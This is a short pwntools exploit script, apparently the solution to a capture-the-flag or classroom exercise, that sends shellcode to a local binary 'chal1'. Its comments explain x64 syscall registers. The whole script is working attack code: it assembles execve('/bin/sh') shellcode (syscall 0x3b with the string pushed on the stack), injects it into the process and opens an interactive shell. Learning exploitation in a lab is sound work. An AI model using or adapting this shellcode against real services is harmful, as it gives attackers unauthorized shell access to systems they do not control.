from pwn import *
context.log_level='debug'
p = process("./chal1")
# p = remote("127.0.0.1",60001)

# Tip: In x64, 
# rdi/rsi/rdx is the register to store the first/second/third parameter of a syscall
# rax is the syscall number, for example `mov rax,0 ; syscall` means calling read
# Also, the return value would be stored at rax

# There is a template of syscall(v1,v2,0,0)
# You can check all Linux x64 syscalls at this page: https://syscalls64.paolostivanin.com/
# Your task is understanding and completing the shellcode
# v1 = 
# v2 = 

v1 = 0x3b
v2 = hex(u64("/bin/sh\0"))

context.arch = 'amd64'

shellcode = f'''
xor rax, rax
xor rdi, rdi
xor rsi, rsi
xor rdx, rdx
mov rax, {v1}
mov rdi, {v2}
push rdi
mov rdi, rsp
syscall 
'''

p.send(asm(shellcode).ljust(0x100,b'\0'))
p.interactive()